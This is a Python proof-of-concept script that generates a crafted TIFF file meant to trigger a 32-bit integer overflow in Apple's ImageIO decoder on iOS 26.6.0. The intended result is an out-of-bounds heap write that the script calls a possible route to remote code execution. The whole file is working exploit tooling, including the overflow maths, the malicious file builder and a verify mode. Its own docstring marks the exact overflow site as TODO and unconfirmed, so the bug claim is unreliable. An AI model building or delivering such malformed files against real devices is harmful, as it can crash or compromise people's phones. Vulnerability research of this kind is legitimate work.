#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
imageio_int_overflow_poc.py — PoC generator for an ImageIO integer overflow (iOS 26.6.0).

Bug class: CWE-190 (integer overflow) in the ImageIO pixel-buffer size computation.
The decoder computes the decoded pixel buffer size as:

    size = width * height * samplesPerPixel * (bitsPerSample / 8)

using 32-bit arithmetic. A crafted header makes `size` wrap to a small value, so
the allocator reserves a small buffer, but the decoder then writes the full
width*height*... bytes into it  ->  out-of-bounds write (crash / potential RCE).

This generator crafts a TIFF (ImageIO's TIFF parser) with:
    ImageWidth      = 0x10001
    ImageLength     = 0x10001
    SamplesPerPixel = 1
    BitsPerSample   = 8
so:
    64-bit size = 0x10001 * 0x10001 = 0x200020001   (~8 GB)
    32-bit size = 0x00020001 = 131,073 bytes        (~128 KB)  <- what gets malloc'd
The decoder writes ~8 GB into the 128 KB buffer -> OOB write.

The EXACT overflow expression in the iOS 26.6.0 ImageIO binary is TODO
(verify with a binary diff / lldb breakpoint on the TIFF decode path).

Usage:
    python3 imageio_int_overflow_poc.py             # generate payload + control
    python3 imageio_int_overflow_poc.py --verify    # read back + show the overflow
"""
import struct, sys, os

# --- overflow parameters ---
WIDTH  = 0x10001
HEIGHT = 0x10001
SPS    = 1          # samples per pixel (grayscale -> BitsPerSample fits inline)
BPS    = 8          # bits per sample
PIXEL  = b"\x42" * 0x200000   # 2 MB strip data (enough to write well past the small buf)

def overflow_math():
    size64 = WIDTH * HEIGHT * SPS * (BPS // 8)
    size32 = size64 & 0xFFFFFFFF
    return size64, size32

def build_tiff(width, height, pixel_bytes):
    """Minimal little-endian TIFF, all tag values inline (fit in 4 bytes)."""
    n_tags = 9
    ifd_off = 8
    ifd_size = 2 + n_tags * 12 + 4
    strip_off = ifd_off + ifd_size
    tags = [
        (256, 4, 1, width),          # ImageWidth (LONG)
        (257, 4, 1, height),         # ImageLength (LONG)
        (258, 3, 1, BPS),            # BitsPerSample (SHORT)
        (259, 3, 1, 1),              # Compression = 1 (none)
        (262, 3, 1, 1),              # Photometric = 1 (BlackIsZero / gray)
        (273, 4, 1, strip_off),      # StripOffsets
        (277, 3, 1, SPS),            # SamplesPerPixel
        (278, 4, 1, height),         # RowsPerStrip = height (single strip)
        (279, 4, 1, len(pixel_bytes)),  # StripByteCounts
    ]
    out = bytearray()
    out += b"II" + struct.pack("<H", 42) + struct.pack("<I", ifd_off)
    out += struct.pack("<H", n_tags)
    for (tid, typ, count, value) in tags:
        out += struct.pack("<HHI", tid, typ, count)
        out += struct.pack("<I", value)
    out += struct.pack("<I", 0)          # next IFD
    out += pixel_bytes
    return bytes(out)

def parse_tiff(data):
    """Read back the header fields to verify the crafted values."""
    assert data[:2] == b"II" and struct.unpack("<H", data[2:4])[0] == 42
    ifd_off = struct.unpack("<I", data[4:8])[0]
    n = struct.unpack("<H", data[ifd_off:ifd_off+2])[0]
    fields = {}
    for i in range(n):
        e = ifd_off + 2 + i*12
        tid, typ, count = struct.unpack("<HHI", data[e:e+8])
        val = struct.unpack("<I", data[e+8:e+12])[0]
        fields[tid] = val
    return fields

def main():
    here = os.path.dirname(os.path.abspath(__file__))
    payload_path = os.path.join(here, "imageio_int_overflow_payload.tiff")
    control_path = os.path.join(here, "imageio_int_overflow_control.tiff")

    size64, size32 = overflow_math()
    print(f"[+] overflow math:")
    print(f"    width*height*sps*bps/8 = 0x{WIDTH:x} * 0x{HEIGHT:x} * {SPS} * {BPS//8}")
    print(f"    64-bit size = 0x{size64:x}  ({size64:,} bytes, ~{size64//1024//1024} MB)")
    print(f"    32-bit size = 0x{size32:x}  ({size32:,} bytes)  <- malloc'd")
    print(f"    OOB write   = 0x{size64 - size32:x} bytes past the buffer")

    payload = build_tiff(WIDTH, HEIGHT, PIXEL)
    with open(payload_path, "wb") as f:
        f.write(payload)
    print(f"[+] payload written: {payload_path} ({len(payload)} B)")

    # control: valid small image (A/B for the oracle)
    control = build_tiff(0x100, 0x100, b"\x42" * 0x10000)
    with open(control_path, "wb") as f:
        f.write(control)
    print(f"[+] control written: {control_path} ({len(control)} B)")

    if "--verify" in sys.argv:
        f = parse_tiff(payload)
        print(f"[+] verify: ImageWidth=0x{f[256]:x} ImageLength=0x{f[257]:x} "
              f"SPS={f[277]} BPS={f[258]} RowsPerStrip=0x{f[278]:x} StripBytes=0x{f[279]:x}")
        assert f[256] == WIDTH and f[257] == HEIGHT
        print(f"[+] header verified: crafted dims present -> 32-bit overflow armed")

if __name__ == "__main__":
    main()
